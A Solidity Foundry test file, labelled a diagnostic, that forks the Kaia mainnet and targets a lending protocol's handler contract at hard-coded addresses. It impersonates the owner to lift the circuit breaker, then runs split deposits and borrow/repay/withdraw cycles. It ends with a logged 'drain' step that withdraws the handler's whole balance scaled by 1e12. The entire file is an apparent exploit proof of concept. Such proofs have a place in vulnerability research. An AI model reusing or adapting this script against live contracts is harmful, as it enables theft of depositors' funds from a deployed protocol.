// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Test, console2} from "forge-std/Test.sol";
interface IERC20K { function approve(address,uint256) external; function balanceOf(address) external view returns (uint256); }
interface IHK { function deposit(uint256,bool) external; function borrow(uint256,bool) external; function withdraw(uint256,bool) external; function repay(uint256,bool) external; }
interface ITMK { function setCircuitBreaker(bool) external; function getCircuitBreaker() external view returns (bool); }
interface IHV { function handlerViewProxy(bytes calldata) external returns (bool, bytes memory); }
contract KaiaDiagTest is Test {
    address constant TM=0x2014e42d5d63b18728b30C1E3360e0B2C0e839cd;
    address constant H=0xe0e67b991d6b5CF73d8A17A10c3DE74616C1ec11;
    address constant T=0xceE8FAF64bB97a73bb51E115Aa89C17FfA8dD167;
    address constant OWNER=0x2184AD186Ff046E1038d9eBbEFAB82e297F37E95;
    function setUp() public { vm.createSelectFork("https://public-en.node.kaia.io"); }
    function amt(address who) internal returns (uint256 d,uint256 b){ (bool ok, bytes memory r)=IHV(H).handlerViewProxy(abi.encodeWithSignature("getUserAmountWithInterest(address)",who)); require(ok,"view"); (d,b)=abi.decode(r,(uint256,uint256)); }
    function test_kaia_diag() public {
        vm.prank(OWNER); ITMK(TM).setCircuitBreaker(false);
        console2.log("unpaused", !ITMK(TM).getCircuitBreaker());
        uint256 h0=IERC20K(T).balanceOf(H); console2.log("h0",h0);
        uint256 D=5_000_000e18;
        deal(T, address(this), D); // 6-dec token: 5M oUSDT
        IERC20K(T).approve(H, type(uint256).max);
        uint256 a=D;
        IHK(H).deposit(a*2995/1_000_000,false);
        IHK(H).deposit(a*11964/1_000_000,false);
        IHK(H).deposit(a*44327/1_000_000,false);
        IHK(H).deposit(a*178736/1_000_000,false);
        IHK(H).deposit(a - a*2995/1_000_000 - a*11964/1_000_000 - a*44327/1_000_000 - a*178736/1_000_000,false);
        IHK(H).deposit(0,false);
        (uint256 d1,uint256 b1)=amt(address(this)); console2.log("after deposits dep",d1); console2.log("  bor",b1); console2.log("  hbal",IERC20K(T).balanceOf(H));
        for (uint i=0;i<20;i++) IHK(H).borrow(a*37/1000,false);
        (uint256 d2,uint256 b2)=amt(address(this)); console2.log("after borrows dep",d2); console2.log("  bor",b2);
        for (uint i=0;i<20;i++){ IHK(H).repay(a*37/1000,false); IHK(H).withdraw(a*5/100,false); }
        (uint256 d3,uint256 b3)=amt(address(this)); console2.log("after cycles dep",d3); console2.log("  bor",b3); console2.log("  hbal",IERC20K(T).balanceOf(H));
        console2.log("my tokens",IERC20K(T).balanceOf(address(this)));
        IHK(H).repay(type(uint256).max,false);
        uint256 bal=IERC20K(T).balanceOf(H);
        console2.log("handler bal before drain",bal);
        if (bal>0) IHK(H).withdraw(bal*1e12,false);
        console2.log("my tokens end",IERC20K(T).balanceOf(address(this)));
        console2.log("handler bal end",IERC20K(T).balanceOf(H));
    }
}
